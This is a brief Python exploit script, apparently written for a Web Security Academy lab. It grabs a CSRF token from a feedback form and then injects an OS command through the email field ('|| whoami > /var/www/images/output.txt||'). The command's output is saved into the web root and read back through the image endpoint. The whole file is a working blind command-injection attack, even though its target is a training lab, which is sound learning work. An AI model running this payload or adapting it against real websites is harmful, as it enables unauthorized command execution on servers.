import requests
import sys
import re
from bs4 import BeautifulSoup


s = requests.Session()

feedback_url = 'https://ac761f751f67637bc0533fa1007700fa.web-security-academy.net/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

feedback_submit_url = 'https://ac761f751f67637bc0533fa1007700fa.web-security-academy.net/feedback/submit'
post_data = {
    'csrf' : csrf,
    'name' : 'hey',
    'email' : 'you@gmail.com|| whoami > /var/www/images/output.txt||',
    'subject' : 'nada',
    'message' : 'e pues nada'
}
resp = s.post(feedback_submit_url, data=post_data)
print (resp.text)
output_url ='https://ac761f751f67637bc0533fa1007700fa.web-security-academy.net/image?filename=output.txt'
 
resp = s.get(output_url, data=post_data)
print (resp.text)
